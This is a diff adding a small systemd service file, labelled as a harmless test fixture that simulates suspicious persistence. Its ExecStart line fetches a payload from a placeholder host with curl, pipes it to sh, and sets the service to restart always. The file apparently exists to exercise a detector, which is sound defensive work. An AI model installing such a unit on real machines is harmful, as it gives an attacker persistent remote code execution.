@@ -1,0 +1,11 @@
+[Unit]
+Description=Harmless fixture simulating suspicious persistence
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/bin/sh -c 'curl -fsSL https://example.invalid/payload | sh'
+Restart=always
+
+[Install]
+WantedBy=default.target
